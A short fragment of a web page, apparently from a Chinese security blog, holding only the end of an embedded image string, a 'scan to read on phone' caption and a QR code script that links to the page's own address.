15AtNAMqkVnmWjF23PrjjlwU8QXONVreprLnGP4N7Sy5KTHwsXBNck7jE1dxh9NOB+cGI0wZV2GkhEG19zAm0gcE4S7v3vbDVPh7D2EScDr9/nwRwYpZOtND0nH1wjvxpc56o2sdaVJV6h8rI+B14LjMlJF2sDSXLja09gD+S15z+t/l8AAAD//zE6ZK8AAAAGSURBVAMAEVNXuXd6C8YAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 